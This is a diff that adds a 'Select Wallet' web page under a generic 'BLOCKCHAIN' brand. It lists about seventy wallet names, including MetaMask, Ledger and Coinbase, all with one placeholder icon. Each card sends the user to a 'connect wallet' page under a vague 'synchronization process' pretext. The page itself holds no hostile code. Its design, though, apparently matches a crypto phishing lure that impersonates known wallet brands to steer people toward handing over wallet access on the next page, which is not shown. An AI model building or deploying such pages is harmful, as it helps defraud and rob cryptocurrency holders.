@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Select Wallet - BLOCKCHAIN</title>
+    <meta name="description" content="Choose your preferred wallet to connect and continue with the synchronization process">
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        .wallet-selection {
+            padding: 120px 0 80px;
+            min-height: 100vh;
+        }
+        
+        .wallet-header {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+        
+        .wallet-header h1 {
+            font-size: 3rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            color: #ffffff;
+        }
+        
+        .wallet-header p {
+            font-size: 1.1rem;
+            color: #cbd5e1;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        
+        .search-container {
+            max-width: 500px;
+            margin: 0 auto 3rem;
+            position: relative;
+        }
+        
+        .search-input {
+            width: 100%;
+            padding: 1rem 1rem 1rem 3rem;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            border-radius: 12px;
+            color: #ffffff;
+            font-size: 1rem;
+            backdrop-filter: blur(10px);
+        }
+        
+        .search-input:focus {
+            outline: none;
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+        }
+        
+        .search-icon {
+            position: absolute;
+            left: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #64748b;
+            width: 20px;
+            height: 20px;
+        }
+        
+        .wallets-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 1.5rem;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .wallet-card {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(59, 130, 246, 0.2);
+            border-radius: 16px;
+            padding: 2rem 1.5rem;
+            text-align: center;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+            cursor: pointer;
+        }
+        
+        .wallet-card:hover {
+            transform: translateY(-5px);
+            border-color: rgba(59, 130, 246, 0.5);
+            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.2);
+            background: rgba(255, 255, 255, 0.08);
+        }
+        
+        .wallet-icon {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 1rem;
+            border-radius: 50%;
+            overflow: hidden;
+            background: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .wallet-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .wallet-name {
+            font-size: 1rem;
+            font-weight: 600;
+            color: #ffffff;
+            margin-bottom: 0.5rem;
+        }
+        
+        .back-button {
+            position: absolute;
+            top: 2rem;
+            left: 2rem;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            color: #ffffff;
+            padding: 0.75rem 1.5rem;
+            border-radius: 8px;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+        
+        .back-button:hover {
+            background: rgba(59, 130, 246, 0.2);
+            border-color: #3b82f6;
+        }
+        
+        .back-button svg {
+            width: 20px;
+            height: 20px;
+        }
+        
+        @media (max-width: 768px) {
+            .wallet-header h1 {
+                font-size: 2.5rem;
+            }
+            
+            .wallets-grid {
+                grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+                gap: 1rem;
+            }
+            
+            .wallet-card {
+                padding: 1.5rem 1rem;
+            }
+            
+            .back-button {
+                top: 1rem;
+                left: 1rem;
+                padding: 0.5rem 1rem;
+                font-size: 0.9rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="nav-logo">
+                <img src="_next/static/media/wallet.819daf29.svg" alt="Blockchain Logo" class="logo-img">
+                <h1>BLOCKCHAIN</h1>
+            </div>
+            <div class="nav-links">
+                <a href="index.html" class="nav-link">Home</a>
+                <a href="select-wallet.html" class="nav-link active">Select Wallet</a>
+                <a href="connect-wallet.html" class="nav-link">Connect Wallet</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Back Button -->
+    <a href="index.html" class="back-button">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="m12 19-7-7 7-7"></path>
+            <path d="M19 12H5"></path>
+        </svg>
+        <span>Back</span>
+    </a>
+
+    <!-- Wallet Selection Section -->
+    <section class="wallet-selection">
+        <div class="container">
+            <div class="wallet-header">
+                <h1>Connect Your Wallet</h1>
+                <p>Choose your preferred wallet to connect and continue with the synchronization process</p>
+            </div>
+
+            <div class="search-container">
+                <svg class="search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <circle cx="11" cy="11" r="8"></circle>
+                    <path d="m21 21-4.3-4.3"></path>
+                </svg>
+                <input type="text" class="search-input" placeholder="Search for your wallet..." id="walletSearch">
+            </div>
+
+            <div class="wallets-grid" id="walletsGrid">
+                <!-- Wallet cards will be populated by JavaScript -->
+            </div>
+        </div>
+    </section>
+
+    <script>
+        // Wallet data
+        const wallets = [
+            { name: 'Wallet Connect', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: '1inch Wallet', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Aave', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Aktionariat', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Alice', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Alpha Wallet', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Argent', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Atomex', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Atomic', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'AT Wallet', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Authereum', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Binana', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Binance Chain', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Bitkeep', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Bitget', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Bitpay', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'BRD', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Bridge Wallet', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Coin98', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Coinbase', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Coinomi', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Cosmos Station', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Cybavo', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Dcent', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Defi', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Digitex', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Dok Wallet', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Easy Pocket', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Ellipal', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Exodus Wallet', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Flare', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Fortmatic', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Fox Wallet', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Gnosis Safe', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Grid Plus', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Halo Defi', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Hippowallet', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Huobi', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'ImToken', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Infinito', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Keyring Pro', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'KyberSwap', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Ledger', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Ledger Live', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Linen', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Loopring', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Math Wallet', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'MetaMask', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Midas', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Mykey', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Nash', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Okx Wallet', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Onto', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'OwnBit', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'PayTube', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Peak Defi', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Particle Wallet', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Phantom', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Pillar', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Portis', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Rainbow', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Ronin', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'RWallet', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'SafeMoon', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'SafePal', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Saitama Wallet', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Slush', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Spark Point', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Spatium', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Sui Wallet', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' },
+            { name: 'Talken', icon: '_next/static/media/wallet.819daf29.svg', category: 'connect' }
+        ];
+
+        // Populate wallet grid
+        function populateWallets(walletList = wallets) {
+            const grid = document.getElementById('walletsGrid');
+            grid.innerHTML = '';
+            
+            walletList.forEach(wallet => {
+                const card = document.createElement('div');
+                card.className = 'wallet-card';
+                card.innerHTML = `
+                    <div class="wallet-icon">
+                        <img src="${wallet.icon}" alt="${wallet.name}" loading="lazy">
+                    </div>
+                    <div class="wallet-name">${wallet.name}</div>
+                `;
+                
+                card.addEventListener('click', () => {
+                    // Add click effect
+                    card.style.transform = 'scale(0.98)';
+                    setTimeout(() => {
+                        card.style.transform = 'translateY(-5px)';
+                    }, 150);
+                    
+                    // Redirect to connect wallet page
+                    setTimeout(() => {
+                        window.location.href = 'connect-wallet.html';
+                    }, 300);
+                });
+                
+                grid.appendChild(card);
+            });
+        }
+
+        // Search functionality
+        function initSearch() {
+            const searchInput = document.getElementById('walletSearch');
+            
+            searchInput.addEventListener('input', (e) => {
+                const searchTerm = e.target.value.toLowerCase();
+                const filteredWallets = wallets.filter(wallet => 
+                    wallet.name.toLowerCase().includes(searchTerm)
+                );
+                populateWallets(filteredWallets);
+            });
+        }
+
+        // Initialize page
+        document.addEventListener('DOMContentLoaded', function() {
+            populateWallets();
+            initSearch();
+        });
+    </script>
+</body>
+</html>
